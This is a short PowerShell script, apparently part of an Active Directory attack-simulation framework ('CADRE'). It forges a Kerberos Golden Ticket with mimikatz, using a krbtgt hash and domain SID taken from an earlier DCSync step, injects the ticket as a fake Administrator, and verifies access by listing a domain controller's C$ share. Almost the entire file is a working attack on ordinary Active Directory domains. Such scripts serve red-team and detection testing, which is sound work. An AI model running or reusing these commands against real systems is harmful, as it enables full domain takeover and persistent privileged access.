# CADRE — WT#010 Golden Ticket
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#010 - Golden Ticket"
start_attack "010" "Golden Ticket"
require_tool mimikatz.exe

# Needs the krbtgt hash + domain SID (from WT#009 DCSync).
step "Get domain SID"
run_cmd "(Get-ADDomain $DOMAIN_ROOT).DomainSID.Value"

step "Forge a Golden Ticket as a fake DA and inject it"
run_cmd "mimikatz.exe `"kerberos::golden /user:Administrator /domain:$DOMAIN_ROOT /sid:<domainSID> /krbtgt:<krbtgtNTLM> /ptt`" exit"

step "Verify ticket + access"
run_cmd "klist; dir \\$DC01\c`$"

result $LASTEXITCODE "Golden Ticket completed"
